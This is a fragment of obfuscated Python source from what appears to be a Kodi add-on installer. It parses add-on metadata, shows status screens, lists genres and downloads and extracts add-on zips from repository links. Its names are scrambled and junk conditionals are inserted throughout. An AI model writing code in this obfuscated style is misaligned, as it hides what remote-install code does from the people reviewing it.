 o00O0O = re . compile ( 'provider_name="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ii1iii1i = re . compile ( 'version="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Iii1I1111ii = re . compile ( 'created="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ooOoO00 = re . compile ( 'addon_types="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Ii1IIiI1i = re . compile ( 'updated="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0O00Oo0 = re . compile ( 'downloads="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 if 33 - 33: O0 * o0oOOo0O0Ooo - iI1iiIiiII % iI1iiIiiII
 I11I = re . compile ( 'description="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I11iIi1i1II11 = re . compile ( 'devbroke="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiI = re . compile ( 'broken="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 i1I1i111Ii = re . compile ( 'deleted="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ooo = re . compile ( 'mainbranch_notes="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 if 27 - 27: OOo00O0 % I1IiiI
 o0oooOO00 = re . compile ( 'repo_url="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiIiii1IIIII = re . compile ( 'data_url="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o00o = re . compile ( 'zip_url="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IIIIiiIiiI = re . compile ( 'genres="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IIIIiI11I11 = re . compile ( 'forum="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oo00o0 = re . compile ( 'repo_id="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 i11II1I11I1 = re . compile ( 'license="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OOoOO0ooo = re . compile ( 'platform="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 II1iIi11 = re . compile ( 'visible="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I11iiii = re . compile ( 'script="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 O0i1iI = re . compile ( 'program_plugin="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IiI1iiiIii = re . compile ( 'script_module="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1III1111iIi = re . compile ( 'video_plugin="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1i111I = re . compile ( 'audio_plugin="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OooOo0oo0O0o00O = re . compile ( 'image_plugin="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1i11 = re . compile ( 'repository="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IiIi1I1 = re . compile ( 'weather_service="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IiIIi1 = re . compile ( 'skin="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IIIIiii1IIii = re . compile ( 'service="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 II1i11I = re . compile ( 'warning="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ii1I1IIii11 = re . compile ( 'web_interface="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 O0o0oO = re . compile ( 'movie_scraper="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IIIIiIiIi1 = re . compile ( 'tv_scraper="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I11iiiiI1i = re . compile ( 'artist_scraper="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iI1i11 = re . compile ( 'music_video_scraper="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OoOOoooOO0O = re . compile ( 'subtitles="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ooo00Ooo = re . compile ( 'requires="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Oo0o0O00 = re . compile ( 'modules="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ii1 = re . compile ( 'icon="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1i11OO = re . compile ( 'video_preview="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0O0oo0OO0O = re . compile ( 'video_guide="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OO0 = re . compile ( 'video_guide1="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0Oooo = re . compile ( 'video_guide2="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiIoO = re . compile ( 'video_guide3="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IIiIi = re . compile ( 'video_guide4="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OOoOooOoOOOoo = re . compile ( 'video_guide5="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Iiii1iI1i = re . compile ( 'video_guide6="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1ii1ii11i1I = re . compile ( 'video_guide7="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0OoOO = re . compile ( 'video_guide8="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 O0O0Oo00 = re . compile ( 'video_guide9="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oOoO00o = re . compile ( 'video_guide10="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oO00O0 = re . compile ( 'video_label1="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IIi1IIIi = re . compile ( 'video_label2="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 O00Ooo = re . compile ( 'video_label3="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OOOO0OOO = re . compile ( 'video_label4="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 i1i1ii = re . compile ( 'video_label5="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iII1ii1 = re . compile ( 'video_label6="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1i1iiiI1 = re . compile ( 'video_label7="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iIIi = re . compile ( 'video_label8="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oO0o00oo0 = re . compile ( 'video_label9="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ii1IIII = re . compile ( 'video_label10="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 if 59 - 59: ooOo * iii1I11ii1i1 % II111iiii
 if 62 - 62: iIii1I11I1II1
 if 12 - 12: Oo / o0oOOo0O0Ooo
 iiI1I1 = O00oO000O0O [ 0 ] if ( len ( O00oO000O0O ) > 0 ) else ''
 ooO = I1i1i1iii [ 0 ] if ( len ( I1i1i1iii ) > 0 ) else ''
 ii = I1111i [ 0 ] if ( len ( I1111i ) > 0 ) else ''
 OO0O0Ooo = iIIii [ 0 ] if ( len ( iIIii ) > 0 ) else ''
 oOoO0 = o00O0O [ 0 ] if ( len ( o00O0O ) > 0 ) else ''
 Oo0 = ii1iii1i [ 0 ] if ( len ( ii1iii1i ) > 0 ) else ''
 oo0O0o00o0O = Iii1I1111ii [ 0 ] if ( len ( Iii1I1111ii ) > 0 ) else ''
 I11i1II = ooOoO00 [ 0 ] if ( len ( ooOoO00 ) > 0 ) else ''
 OooiiIi1i = Ii1IIiI1i [ 0 ] if ( len ( Ii1IIiI1i ) > 0 ) else ''
 I1i11111i1i11 = o0O00Oo0 [ 0 ] if ( len ( o0O00Oo0 ) > 0 ) else ''
 if 77 - 77: I1ii11iIi11i + OoO0O00 / ooOo + O0 * o0oOOo0O0Ooo
 I1ii11 = '[CR][CR][COLOR=dodgerblue]Description: [/COLOR]' + I11I [ 0 ] if ( len ( I11I ) > 0 ) else ''
 oOoOoOoo0 = I11iIi1i1II11 [ 0 ] if ( len ( I11iIi1i1II11 ) > 0 ) else ''
 III1ii1I = iiI [ 0 ] if ( len ( iiI ) > 0 ) else ''
 Ii1i1iI = '[CR]' + i1I1i111Ii [ 0 ] if ( len ( i1I1i111Ii ) > 0 ) else ''
 IIiI1 = '[CR][CR][COLOR=dodgerblue]User Notes: [/COLOR]' + ooo [ 0 ] if ( len ( ooo ) > 0 ) else ''
 if 17 - 17: Oo / Oo / iii1I11ii1i1
 ii1I1IiiI1ii1i = o0oooOO00 [ 0 ] if ( len ( o0oooOO00 ) > 0 ) else ''
 O0o = iiIiii1IIIII [ 0 ] if ( len ( iiIiii1IIIII ) > 0 ) else ''
 oO0OoO00o = o00o [ 0 ] if ( len ( o00o ) > 0 ) else ''
 II1iiiiII = IIIIiiIiiI [ 0 ] if ( len ( IIIIiiIiiI ) > 0 ) else ''
 O0OoOO0oo0 = '[CR][CR][COLOR=dodgerblue]Support Forum: [/COLOR]' + IIIIiI11I11 [ 0 ] if ( len ( IIIIiI11I11 ) > 0 ) else '[CR][CR][COLOR=dodgerblue]Support Forum: [/COLOR]No forum details given by developer'
 oOO = IIIIiI11I11 [ 0 ] if ( len ( IIIIiI11I11 ) > 0 ) else 'None'
 O0o0OO0000ooo = oo00o0 [ 0 ] if ( len ( oo00o0 ) > 0 ) else ''
 license = i11II1I11I1 [ 0 ] if ( len ( i11II1I11I1 ) > 0 ) else ''
 iIIII1iIIii = '[COLOR=orange]     Platform: [/COLOR]' + OOoOO0ooo [ 0 ] if ( len ( OOoOO0ooo ) > 0 ) else ''
 oOOO00o000o = II1iIi11 [ 0 ] if ( len ( II1iIi11 ) > 0 ) else ''
 iIi11i1 = I11iiii [ 0 ] if ( len ( I11iiii ) > 0 ) else ''
 oO00oo0o00o0o = O0i1iI [ 0 ] if ( len ( O0i1iI ) > 0 ) else ''
 IiIIIIIi = IiI1iiiIii [ 0 ] if ( len ( IiI1iiiIii ) > 0 ) else ''
 IiIi1iIIi1 = I1III1111iIi [ 0 ] if ( len ( I1III1111iIi ) > 0 ) else ''
 O0OoO0ooOO0o = I1i111I [ 0 ] if ( len ( I1i111I ) > 0 ) else ''
 OoOo0oOooOoOO = OooOo0oo0O0o00O [ 0 ] if ( len ( OooOo0oo0O0o00O ) > 0 ) else ''
 oo00ooOoO00 = I1i11 [ 0 ] if ( len ( I1i11 ) > 0 ) else ''
 o00oOoOo0 = IIIIiii1IIii [ 0 ] if ( len ( IIIIiii1IIii ) > 0 ) else ''
 oOOoo0Oo = IiIIi1 [ 0 ] if ( len ( IiIIi1 ) > 0 ) else ''
 o0O0O0ooo0oOO = II1i11I [ 0 ] if ( len ( II1i11I ) > 0 ) else ''
 oo000 = ii1I1IIii11 [ 0 ] if ( len ( ii1I1IIii11 ) > 0 ) else ''
 iiOoO = IiIi1I1 [ 0 ] if ( len ( IiIi1I1 ) > 0 ) else ''
 Iiiiii111i1ii = O0o0oO [ 0 ] if ( len ( O0o0oO ) > 0 ) else ''
 i1i1iII1 = IIIIiIiIi1 [ 0 ] if ( len ( IIIIiIiIi1 ) > 0 ) else ''
 iii11i1IIII = I11iiiiI1i [ 0 ] if ( len ( I11iiiiI1i ) > 0 ) else ''
 Ii = iI1i11 [ 0 ] if ( len ( iI1i11 ) > 0 ) else ''
 o00iiI1Ii1 = OoOOoooOO0O [ 0 ] if ( len ( OoOOoooOO0O ) > 0 ) else ''
 ii1i = ooo00Ooo [ 0 ] if ( len ( ooo00Ooo ) > 0 ) else ''
 oOOoo = Oo0o0O00 [ 0 ] if ( len ( Oo0o0O00 ) > 0 ) else ''
 iII1111III1I = ii1 [ 0 ] if ( len ( ii1 ) > 0 ) else ''
 ii11i = I1i11OO [ 0 ] if ( len ( I1i11OO ) > 0 ) else 'None'
 O00oOo00o0o = o0O0oo0OO0O [ 0 ] if ( len ( o0O0oo0OO0O ) > 0 ) else 'None'
 O00oO0 = OO0 [ 0 ] if ( len ( OO0 ) > 0 ) else 'None'
 O0Oo00OoOo = o0Oooo [ 0 ] if ( len ( o0Oooo ) > 0 ) else 'None'
 ii1ii111 = iiIoO [ 0 ] if ( len ( iiIoO ) > 0 ) else 'None'
 i11111I1I = IIiIi [ 0 ] if ( len ( IIiIi ) > 0 ) else 'None'
 ii1Oo0000oOo = OOoOooOoOOOoo [ 0 ] if ( len ( OOoOooOoOOOoo ) > 0 ) else 'None'
 I11o0oO00oO0o0o0 = Iiii1iI1i [ 0 ] if ( len ( Iiii1iI1i ) > 0 ) else 'None'
 I1Iooooo = I1ii1ii11i1I [ 0 ] if ( len ( I1ii1ii11i1I ) > 0 ) else 'None'
 i11IIIiI1I = o0OoOO [ 0 ] if ( len ( o0OoOO ) > 0 ) else 'None'
 o0 = O0O0Oo00 [ 0 ] if ( len ( O0O0Oo00 ) > 0 ) else 'None'
 iiiI1I1iIIIi1 = oOoO00o [ 0 ] if ( len ( oOoO00o ) > 0 ) else 'None'
 Iii = oO00O0 [ 0 ] if ( len ( oO00O0 ) > 0 ) else 'None'
 I1iiiiI1iI = IIi1IIIi [ 0 ] if ( len ( IIi1IIIi ) > 0 ) else 'None'
 iIiiiii1i = O00Ooo [ 0 ] if ( len ( O00Ooo ) > 0 ) else 'None'
 iiIi1IIiI = OOOO0OOO [ 0 ] if ( len ( OOOO0OOO ) > 0 ) else 'None'
 i1oO0OO0 = i1i1ii [ 0 ] if ( len ( i1i1ii ) > 0 ) else 'None'
 o0O0Oo00 = iII1ii1 [ 0 ] if ( len ( iII1ii1 ) > 0 ) else 'None'
 O0Oo0o000oO = I1i1iiiI1 [ 0 ] if ( len ( I1i1iiiI1 ) > 0 ) else 'None'
 oO0o00oOOooO0 = iIIi [ 0 ] if ( len ( iIIi ) > 0 ) else 'None'
 OOOoO000 = oO0o00oo0 [ 0 ] if ( len ( oO0o00oo0 ) > 0 ) else 'None'
 oOOOO = ii1IIII [ 0 ] if ( len ( ii1IIII ) > 0 ) else 'None'
 if 49 - 49: II111iiii . ooOo . i11iIiiIii % oOoO0o00OO0
 if Ii1i1iI != '' :
  i11i1iiI1i = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=red]This add-on is depreciated, it\'s no longer available.[/COLOR]'
  if 87 - 87: OOo00O0
 elif III1ii1I == '' and oOoOoOoo0 == '' and o0O0O0ooo0oOO == '' :
  i11i1iiI1i = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=lime]No reported problems[/COLOR]'
  if 45 - 45: OoO0O00 / OoooooooOO - oo0oooooO0 / OO0oo0oOO % oOoO0o00OO0
 elif III1ii1I == '' and oOoOoOoo0 == '' and o0O0O0ooo0oOO != '' and Ii1i1iI == '' :
  i11i1iiI1i = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=orange]Although there have been no reported problems there may be issues with this add-on, see below.[/COLOR]'
  if 83 - 83: I1IiiI . iIii1I11I1II1 - oOoO0o00OO0 * i11iIiiIii
 elif III1ii1I == '' and oOoOoOoo0 != '' :
  i11i1iiI1i = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by the add-on developer.[CR][COLOR=dodgerblue]Developer Comments: [/COLOR]' + oOoOoOoo0
  if 20 - 20: i1IIi * iI1iiIiiII + II111iiii % o0oOOo0O0Ooo % ooOo
 elif III1ii1I != '' and oOoOoOoo0 == '' :
  i11i1iiI1i = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by a member of the community at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR][CR][COLOR=dodgerblue]User Comments: [/COLOR]' + III1ii1I
  if 13 - 13: Oo0Ooo
 elif III1ii1I != '' and oOoOoOoo0 != '' :
  i11i1iiI1i = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by both the add-on developer and a member of the community at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR][CR][COLOR=dodgerblue]Developer Comments: [/COLOR]' + oOoOoOoo0 + '[CR][COLOR=dodgerblue]User Comments: [/COLOR]' + III1ii1I
  if 60 - 60: I1ii11iIi11i * I1IiiI
  if 17 - 17: Oo % Oo0Ooo / I1ii11iIi11i . oOoO0o00OO0 * Oo - II111iiii
 i1i1IIii1i1 = str ( '[COLOR=orange]Name: [/COLOR]' + ooO + '[COLOR=orange]     Author(s): [/COLOR]' + oOoO0 + '[COLOR=orange][CR][CR]Version: [/COLOR]' + Oo0 + '[COLOR=orange]     Created: [/COLOR]' + oo0O0o00o0O + '[COLOR=orange]     Updated: [/COLOR]' + OooiiIi1i + '[COLOR=orange][CR][CR]Repository: [/COLOR]' + O0o0OO0000ooo + iIIII1iIIii + '[COLOR=orange]     Add-on Type(s): [/COLOR]' + I11i1II + ii1i + i11i1iiI1i + Ii1i1iI + o0O0O0ooo0oOO + O0OoOO0oo0 + I1ii11 + IIiI1 )
 if 65 - 65: I1IiiI + OoOoOO00 / Oo
 if 83 - 83: o0oOOo0O0Ooo . oo0oooooO0 - Oo0Ooo
 if os . path . exists ( os . path . join ( Ooo , OO0O0Ooo ) ) :
  if 'script.module' in OO0O0Ooo or 'repo' in OO0O0Ooo :
   iIiIIi1 ( '' , '[COLOR=orange]Already installed[/COLOR]' , '' , '' , iII1111III1I , '' , '' , '' )
  else :
   iIiIIi1 ( '' , '[COLOR=orange]Already installed -[/COLOR] Click here to run the add-on' , OO0O0Ooo , 'run_addon' , iII1111III1I , '' , '' , '' )
   if 65 - 65: iIii1I11I1II1 / OOo00O0 . oOoO0o00OO0 - II111iiii
   if 72 - 72: iIii1I11I1II1 / oOoO0o00OO0 % oo0oooooO0 % Oo - iii1I11ii1i1 % Oo
 if ooO == '' :
  iIiIIi1 ( '' , '[COLOR=yellow]Sorry request failed due to high traffic on server, please try again[/COLOR]' , '' , '' , iII1111III1I , '' , '' , '' )
  if 100 - 100: Oo0Ooo + i11iIiiIii
  if 71 - 71: iii1I11ii1i1 / o0oOOo0O0Ooo / iI1iiIiiII % Oo
 elif ooO != '' :
  if 51 - 51: oOoO0o00OO0 * O0 / II111iiii . OO0oo0oOO % Oo / I1IiiI
  if ( III1ii1I == '' ) and ( oOoOoOoo0 == '' ) and ( Ii1i1iI == '' ) and ( o0O0O0ooo0oOO == '' ) :
   iIiIIi1 ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR] No problems reported' , i1i1IIii1i1 , 'text_guide' , iII1111III1I , '' , '' , i1i1IIii1i1 )
   if 9 - 9: I1IiiI % I1IiiI % II111iiii
  if ( III1ii1I != '' and Ii1i1iI == '' ) or ( oOoOoOoo0 != '' and Ii1i1iI == '' ) or ( o0O0O0ooo0oOO != '' and Ii1i1iI == '' ) :
   iIiIIi1 ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR][COLOR=orange] Possbile problems reported[/COLOR]' , i1i1IIii1i1 , 'text_guide' , iII1111III1I , '' , '' , i1i1IIii1i1 )
   if 30 - 30: oOoO0o00OO0 + iI1iiIiiII - oOoO0o00OO0 . oOoO0o00OO0 - II111iiii + O0
  if Ii1i1iI != '' :
   iIiIIi1 ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR][COLOR=red] Add-on now depreciated[/COLOR]' , i1i1IIii1i1 , 'text_guide' , iII1111III1I , '' , '' , i1i1IIii1i1 )
   if 86 - 86: i1IIi
   if 41 - 41: OoOoOO00 * iii1I11ii1i1 / OoOoOO00 % ooOo
  if Ii1i1iI == '' :
   if 18 - 18: II111iiii . OoooooooOO % OoOoOO00 % OO0oo0oOO
   if O0o0OO0000ooo != '' and 'superrepo' not in O0o0OO0000ooo :
    OoO ( '[COLOR=lime][INSTALL - Recommended] [/COLOR]' + ooO , ooO , '' , 'addon_install_zero' , 'Install.png' , '' , '' , I1ii11 , iiI1I1 , ii1I1IiiI1ii1i , O0o0OO0000ooo , OO0O0Ooo , oOoO0 , oOO , O0o )
    OoO ( '[COLOR=lime][INSTALL - Backup Option] [/COLOR]' + ooO , ooO , '' , 'addon_install' , 'Install.png' , '' , '' , I1ii11 , oO0OoO00o , ii1I1IiiI1ii1i , O0o0OO0000ooo , OO0O0Ooo , oOoO0 , oOO , O0o )
    if 9 - 9: OoO0O00 - Oo0Ooo * OoooooooOO . Oo0Ooo
   if O0o0OO0000ooo == '' or 'superrepo' in O0o0OO0000ooo :
    OoO ( '[COLOR=lime][INSTALL] [/COLOR]' + ooO + ' - THIS IS NOT IN A SELF UPDATING REPO' , ooO , '' , 'addon_install' , 'Install.png' , '' , '' , I1ii11 , oO0OoO00o , ii1I1IiiI1ii1i , O0o0OO0000ooo , OO0O0Ooo , oOoO0 , oOO , O0o )
    if 2 - 2: OoooooooOO % Oo
    if 63 - 63: I1IiiI % iIii1I11I1II1
  if ii11i != 'None' :
   iIiIIi1 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  Preview' , O00oO0 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 39 - 39: oo0oooooO0 / II111iiii / I1ii11iIi11i % I1IiiI
  if O00oO0 != 'None' :
   iIiIIi1 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + Iii , O00oO0 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 89 - 89: iI1iiIiiII + OoooooooOO + iI1iiIiiII * i1IIi + iIii1I11I1II1 % iii1I11ii1i1
  if O0Oo00OoOo != 'None' :
   iIiIIi1 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + I1iiiiI1iI , O0Oo00OoOo , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 59 - 59: Oo + i11iIiiIii
  if ii1ii111 != 'None' :
   iIiIIi1 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + iIiiiii1i , ii1ii111 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 88 - 88: i11iIiiIii - OOo00O0
  if i11111I1I != 'None' :
   iIiIIi1 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + iiIi1IIiI , i11111I1I , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 67 - 67: Oo . Oo0Ooo + OoOoOO00 - OoooooooOO
  if ii1Oo0000oOo != 'None' :
   iIiIIi1 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + i1oO0OO0 , ii1Oo0000oOo , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 70 - 70: Oo / II111iiii - iIii1I11I1II1 - oo0oooooO0
  if I11o0oO00oO0o0o0 != 'None' :
   iIiIIi1 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + o0O0Oo00 , I11o0oO00oO0o0o0 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 11 - 11: iIii1I11I1II1 . OoooooooOO . II111iiii / i1IIi - iii1I11ii1i1
  if I1Iooooo != 'None' :
   iIiIIi1 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + O0Oo0o000oO , I1Iooooo , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 30 - 30: OoOoOO00
  if i11IIIiI1I != 'None' :
   iIiIIi1 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + oO0o00oOOooO0 , i11IIIiI1I , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 21 - 21: i11iIiiIii / iI1iiIiiII % Oo * O0 . iii1I11ii1i1 - iIii1I11I1II1
  if o0 != 'None' :
   iIiIIi1 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + OOOoO000 , o0 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 26 - 26: II111iiii * OoOoOO00
  if iiiI1I1iIIIi1 != 'None' :
   iIiIIi1 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + oOOOO , iiiI1I1iIIIi1 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
   if 10 - 10: II111iiii . oo0oooooO0
   if 32 - 32: OO0oo0oOO . oOoO0o00OO0 . OoooooooOO - OoO0O00 + ooOo
def ooO0oO00O0o ( url ) :
 iIiIIi1 ( 'folder' , 'Anime' , url + '&genre=anime' , 'grab_addons' , 'anime.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Audiobooks' , url + '&genre=audiobooks' , 'grab_addons' , 'audiobooks.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Comedy' , url + '&genre=comedy' , 'grab_addons' , 'comedy.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Comics' , url + '&genre=comics' , 'grab_addons' , 'comics.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Documentary' , url + '&genre=documentary' , 'grab_addons' , 'documentary.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Downloads' , url + '&genre=downloads' , 'grab_addons' , 'downloads.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Food' , url + '&genre=food' , 'grab_addons' , 'food.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Gaming' , url + '&genre=gaming' , 'grab_addons' , 'gaming.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Health' , url + '&genre=health' , 'grab_addons' , 'health.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'How To...' , url + '&genre=howto' , 'grab_addons' , 'howto.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Kids' , url + '&genre=kids' , 'grab_addons' , 'kids.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Live TV' , url + '&genre=livetv' , 'grab_addons' , 'livetv.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Movies' , url + '&genre=movies' , 'grab_addons' , 'movies.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Music' , url + '&genre=music' , 'grab_addons' , 'music.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'News' , url + '&genre=news' , 'grab_addons' , 'news.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Photos' , url + '&genre=photos' , 'grab_addons' , 'photos.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Podcasts' , url + '&genre=podcasts' , 'grab_addons' , 'podcasts.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Radio' , url + '&genre=radio' , 'grab_addons' , 'radio.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Religion' , url + '&genre=religion' , 'grab_addons' , 'religion.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Space' , url + '&genre=space' , 'grab_addons' , 'space.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Sports' , url + '&genre=sports' , 'grab_addons' , 'sports.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Technology' , url + '&genre=tech' , 'grab_addons' , 'tech.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Trailers' , url + '&genre=trailers' , 'grab_addons' , 'trailers.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'TV Shows' , url + '&genre=tv' , 'grab_addons' , 'tv.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Misc.' , url + '&genre=other' , 'grab_addons' , 'other.png' , '' , '' , '' )
 if 70 - 70: iI1iiIiiII
 if o0O . getSetting ( 'adult' ) == 'true' :
  iIiIIi1 ( 'folder' , 'XXX' , url + '&genre=adult' , 'grab_addons' , 'adult.png' , '' , '' , '' )
  if 16 - 16: oo0oooooO0 - OoooooooOO % Oo0Ooo
  if 36 - 36: Oo
def O0oii111 ( name , zip_link , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 forum = str ( forum )
 repo_id = str ( repo_id )
 O0OO0oOoO0O0O = 1
 oo000oOo0 = 1
 iIiI1I1Ii = 1
 III = xbmc . translatePath ( os . path . join ( Ooo , addon_id ) )
 if 1 - 1: ooOo
 if os . path . exists ( III ) :
  oo00OooO = 1
  if 57 - 57: Oo + iIii1I11I1II1 % i1IIi % I1IiiI
 else :
  oo00OooO = 0
  if 83 - 83: o0oOOo0O0Ooo / i11iIiiIii % iIii1I11I1II1 . iii1I11ii1i1 % ooOo . OoooooooOO
 o00oO00 = xbmc . translatePath ( os . path . join ( OOO00O , name + '.zip' ) )
 OO0oOOo = xbmc . translatePath ( os . path . join ( Ooo , addon_id ) )
 if 94 - 94: o0oOOo0O0Ooo + OoooooooOO * iii1I11ii1i1 - Oo0Ooo . oOoO0o00OO0 - o0oOOo0O0Ooo
 iiI1IiI . create ( "Installing Addon" , "Please wait whilst your addon is installed" , '' , '' )
 if 39 - 39: OO0oo0oOO * OOo00O0 / OoOoOO00 * OoO0O00 . iii1I11ii1i1 % II111iiii
 try :
  downloader . download ( repo_link , o00oO00 , iiI1IiI )
  O0OoOoO00O ( o00oO00 , Ooo , iiI1IiI )
  if 96 - 96: I1IiiI % Oo0Ooo . I1ii11iIi11i + Oo
 except :
  if 42 - 42: II111iiii * oo0oooooO0 * i11iIiiIii - Oo . OoooooooOO
  try :
   downloader . download ( zip_link , o00oO00 , iiI1IiI )
   O0OoOoO00O ( o00oO00 , Ooo , iiI1IiI )
   if 76 - 76: II111iiii
  except :
   if 26 - 26: II111iiii % i11iIiiIii % iIii1I11I1II1 % iii1I11ii1i1 * iii1I11ii1i1 * I1ii11iIi11i
   try :
    if not os . path . exists ( OO0oOOo ) :
     os . makedirs ( OO0oOOo )
     if 24 - 24: II111iiii % iI1iiIiiII - OOo00O0 + I1IiiI * I1ii11iIi11i
    IIo0o0O0O00oOOo = iIIIiIi ( data_path ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    i11111I1IOoo0ooOOOOoOo = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( IIo0o0O0O00oOOo )
